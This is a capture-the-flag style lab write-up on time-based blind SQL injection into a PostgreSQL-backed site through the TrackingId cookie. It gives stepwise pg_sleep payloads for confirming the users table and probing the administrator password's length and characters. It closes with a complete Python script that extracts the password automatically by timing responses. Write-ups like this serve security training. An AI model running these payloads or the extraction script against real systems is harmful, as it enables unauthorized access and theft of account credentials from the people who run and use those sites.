* Title:  Blind SQL injection with time delays and information retrieval

* Goal: Log in as the administrator user.

* Vulnerable Part : In the cookies. Specifically, right after "TrackingId"

* Payload Used: 

``` ; SELECT CASE WHEN(1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- ```, 

``` ; SELECT CASE WHEN(1=2) THEN pg_sleep(5) ELSE pg_sleep(0) END-- ```,

``` ; SELECT CASE WHEN(username='administrator') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users-- ```, 

``` ; SELECT CASE WHEN(username='administrator' AND LENGTH(password)=20) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users-- ```, 

``` ; SELECT CASE WHEN(username='administrator' AND SUBSTRING(password, 1, 1) > 'm') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users-- ```

**NOTICE: If you are using Burp Suite to inject this payload, make sure to encode them in URL. To do that, you select it and ```ctrl + u```**

**NOTICE: The backend is written in PostgreSQL**

* Steps:

  1. Inject : ``` ; SELECT CASE WHEN(1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- ```. What this does is, it delays the response by 5 seconds if the condition is true, in this case 1=1.

  2. Inject : ``` ; SELECT CASE WHEN(1=2) THEN pg_sleep(5) ELSE pg_sleep(0) END-- ```. And if the condition is not true, the response comes instantly.
 
  3. Inject : ``` ; SELECT CASE WHEN(username='administrator') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users-- ```. If the condition is true (that means, if the users table exists
  and the username 'administrator' is in it), it delays the response. Otherwise, it won't delay the response.

  4. Inject : ``` ; SELECT CASE WHEN(username='administrator' AND LENGTH(password)=20) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users-- ```. If the username is 'administrator' and
     the password is 20 characters, you guessed it right, it delays the response. In the real world scenario, you might need to use binary search to get the exact length (For example,
     ...```LENGTH(password) > 10```, response delayed which means condition is true, ...```LENGTH(password) > 25```, instant response which means condition is false,
     ...```LENGTH(password) > 23```, instant response which means condition is false... something like this. But the length of the password is 20)

  5. Inject : ``` ; SELECT CASE WHEN(username='administrator' AND SUBSTRING(password, 1, 1) > 'm') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users-- ```.
     This payload detects if the first character of the password is greater than 'm'. If yes we try a letter greater than 'm'(like 'p' or something).
     But I don't recommend doing this for the whole password, so we're just gonna script it using python.

Python Script: 

```
        # Import necessary modules for HTTP requests, URL encoding, and system operations
    import urllib
    import urllib3
    import sys
    import requests
    
    # Suppress SSL certificate warnings (useful when targeting labs with self-signed certs)
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    def password_injector(url, base_tracking_id, session_id):
        # Initialize the variable to store the extracted password
        password_extracted = ""
    
        # Define the character set to brute-force each character of the password
        charset = "0123456789abcdefghijklmnopqrstuvwxyz"
    
        # Loop through each position in the password (assuming max length of 20)
        for i in range(1, 21):
            # Try each character in the charset for the current position
            for ch in charset:
                # Craft a time-based blind SQL injection payload:
                # If the character at position i matches `ch`, delay the response by 8 seconds
                payload = f"' ; SELECT CASE WHEN(username='administrator' AND SUBSTRING(password, {i}, 1) = '{ch}') THEN pg_sleep(8) ELSE pg_sleep(0) END FROM users-- "
    
                # URL-encode the payload to safely inject it into the TrackingId cookie
                payload_encoded = urllib.parse.quote(payload)
    
                # Construct the cookies with the injected payload
                cookies = {
                    "TrackingId": base_tracking_id + payload_encoded,
                    "session": session_id
                }
    
                # Send the HTTP request with the malicious cookies
                response = requests.get(url, cookies=cookies, verify=False)
    
                # If the response took ≥8 seconds, the guessed character is correct
                if int(response.elapsed.total_seconds()) >= 8:
                    password_extracted += ch  # Append the correct character
                    sys.stdout.write('\r' + password_extracted)  # Display progress
                    sys.stdout.flush()
                    break  # Move to the next character position
    
                else:
                    # Show the current guess (even if incorrect) for visual feedback
                    sys.stdout.write('\r' + password_extracted + ch)
                    sys.stdout.flush()
    
        # Print the final extracted password
        print(f"\n[+] EXTRACTED PASSWORD : {password_extracted}")
    
    def main():
        # Ensure correct number of command-line arguments
        if len(sys.argv) != 4:
            print(f"[+] Usage: {sys.argv[0]} <url> TrackingId SessionId")
            print(f"[+] Example : {sys.argv[0]} www.example.com" "nRoouTRuuq9Ate8w" "lwz0qgqnBKdlhlFOXFRxGVA9RHSxdIss")
            sys.exit(-1)
    
        # Parse command-line arguments
        url = sys.argv[1]
        tracking_id = sys.argv[2]
        session_id = sys.argv[3]
    
        # Begin the password extraction process
        print("[+] Retrieving password...")
        password_injector(url, tracking_id, session_id)
    
    # Entry point of the script
    if __name__ == "__main__":
        main()

```

* Takeaway: This write-up shows how timing can be weaponized to extract sensitive data without any visible output.
